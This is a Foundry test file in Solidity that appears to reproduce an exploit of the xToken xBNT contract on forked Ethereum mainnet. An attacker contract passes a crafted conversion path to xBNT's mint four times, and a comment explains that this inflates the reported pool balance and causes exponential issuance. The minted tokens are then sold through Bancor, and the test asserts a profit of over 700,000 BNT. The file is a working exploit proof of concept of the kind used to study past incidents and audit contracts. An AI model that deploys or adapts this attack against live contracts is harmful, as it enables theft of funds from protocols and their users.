// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

interface IXBNT is IERC20 {
    function mint(
        address[] calldata path,
        uint256 minReturn
    ) external payable;
}

interface IBancorNetwork {
    function convertByPath(
        address[] calldata path,
        uint256 amount,
        uint256 minReturn,
        address beneficiary,
        address affiliateAccount,
        uint256 affiliateFee
    ) external payable returns (uint256);
}

contract XTokenMayAttacker {
    IXBNT private constant XBNT = IXBNT(0x39F8e6c7877478de0604fe693c6080511Bc0A6DA);
    IERC20 private constant BNT = IERC20(0x1F573D6Fb3F13d689FF844B4cE37794d79a7FF1C);
    IBancorNetwork private constant BANCOR = IBancorNetwork(0x2F9EC37d6CcFFf1caB21733BdaDEdE11c823cCB0);

    function attack() external payable {
        address[] memory maliciousPath = new address[](5);
        maliciousPath[0] = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
        maliciousPath[1] = 0xb1CD6e4153B2a390Cf00A6556b0fC1458C4A5533;
        maliciousPath[2] = address(BNT);
        maliciousPath[3] = 0xb2F40825d32b658d39e4F73bB34D33BA628e8B76;
        maliciousPath[4] = 0x1dEa979ae76f26071870F824088dA78979eb91C8;

        // xBNT trusts an arbitrary conversion path. Each conversion manipulates the
        // reported pool balance used by the following mint, causing exponential issuance.
        for (uint256 i; i < 4; ++i) {
            XBNT.mint{value: 0.03 ether}(maliciousPath, 1);
        }

        address[] memory exitPath = new address[](3);
        exitPath[0] = address(XBNT);
        exitPath[1] = 0x56a6594a55c4580D525934FF180485eD00adBf4b;
        exitPath[2] = address(BNT);

        uint256 amountToSell = XBNT.balanceOf(address(this)) / 2;
        XBNT.approve(address(BANCOR), amountToSell);
        BANCOR.convertByPath(exitPath, amountToSell, 1, msg.sender, address(0), 0);
    }
}

contract XTokenMayExploitTest is Test {
    IERC20 private constant BNT = IERC20(0x1F573D6Fb3F13d689FF844B4cE37794d79a7FF1C);

    function testExploit() public {
        vm.createSelectFork("https://eth.drpc.org", 12_419_917);
        XTokenMayAttacker attacker = new XTokenMayAttacker();
        deal(address(attacker), 0.12 ether);

        uint256 bntBefore = BNT.balanceOf(address(this));
        attacker.attack();

        assertGt(BNT.balanceOf(address(this)) - bntBefore, 700_000 ether);
    }
}
